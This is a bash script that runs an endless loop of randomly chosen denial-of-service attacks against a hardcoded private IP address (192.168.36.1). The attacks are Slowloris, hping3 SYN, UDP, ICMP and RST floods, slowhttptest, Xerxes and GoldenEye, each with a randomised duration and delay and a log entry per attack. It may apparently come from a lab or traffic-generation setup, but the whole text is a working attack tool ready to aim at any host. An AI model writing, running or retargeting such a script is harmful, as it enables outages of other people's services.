#!/bin/bash

# Target IP
TARGET_IP="192.168.36.1"

# Log file with timestamped name
LOG_FILE="dos_log_$(date '+%Y%m%d').txt"

# Function to log attacks
log_attack() {
    local attack_name=$1
    local duration=$2
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Executed $attack_name on $TARGET_IP for ${duration}s" >> "$LOG_FILE"
}

# Function to run Slowloris DoS attack
run_slowloris() {
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT slowloris $TARGET_IP &> /dev/null &
    log_attack "Slowloris" "$TIMEOUT"
}

# Function to run Hping3 (TCP SYN flood)
run_hping3() {
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT hping3 --flood -S $TARGET_IP -p 80 &> /dev/null &
    log_attack "Hping3 SYN Flood" "$TIMEOUT"
}

# Function to run SYN flood attack using Hping3
run_synflood() {
    hping3 -i u40 -S -p 80 -c 100000 $TARGET_IP &> /dev/null &
    log_attack "SYN Flood" "N/A"
}

# Function to run Slowhttptest (Slow HTTP DoS)
run_slowhttptest() {
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT slowhttptest -c 100 -i 10 -r 200 -t GET -p 80 -u http://$TARGET_IP &> /dev/null &
    log_attack "Slowhttptest" "$TIMEOUT"
}

# Function to run UDP flood attack using Hping3
run_udpflood() {
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT hping3 --flood --udp $TARGET_IP -p 53 &> /dev/null &
    log_attack "UDP Flood" "$TIMEOUT"
}

# Function to run Xerxes (HTTP DoS attack)
run_xerxes() {
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT ./xerxes $TARGET_IP 80 &> /dev/null &
    log_attack "Xerxes" "$TIMEOUT"
}

# Function to run GoldenEye (HTTP DoS attack)
run_goldeneye() {
    TIMEOUT=$((RANDOM % 61 + 120)) 
    timeout $TIMEOUT python3 goldeneye.py http://$TARGET_IP &> /dev/null &
    log_attack "GoldenEye" "$TIMEOUT"
}

# Function to run ICMP Flood attack
run_icmp_flood() {
    TIMEOUT=$((RANDOM % 61 + 120))
    timeout $TIMEOUT hping3 --flood --icmp $TARGET_IP &> /dev/null &
    log_attack "ICMP Flood" "$TIMEOUT"
}

# Function to run TCP RST Flood attack
run_rst_flood() {
    TIMEOUT=$((RANDOM % 61 + 120)) 
    timeout $TIMEOUT hping3 -R --flood $TARGET_IP -p 80 &> /dev/null &
    log_attack "TCP RST Flood" "$TIMEOUT"
}

# Main function to run DoS attacks continuously
main() {
    echo "Logging DoS attacks to $LOG_FILE"

    # List of available attack functions
    ATTACKS=(
        "run_slowloris" "run_hping3" "run_synflood" "run_slowhttptest"
        "run_udpflood" "run_xerxes" "run_goldeneye" "run_icmp_flood" 
        "run_rst_flood"
    )

    while true; do
        # Select a random attack
        ATTACK=${ATTACKS[$RANDOM % ${#ATTACKS[@]}]}

        # Execute the selected attack
        $ATTACK

        # Random delay greater than 180 seconds
        RANDOM_DELAY=$((RANDOM % 101 + 200))
        sleep $RANDOM_DELAY
    done
}

# Start the main function
main
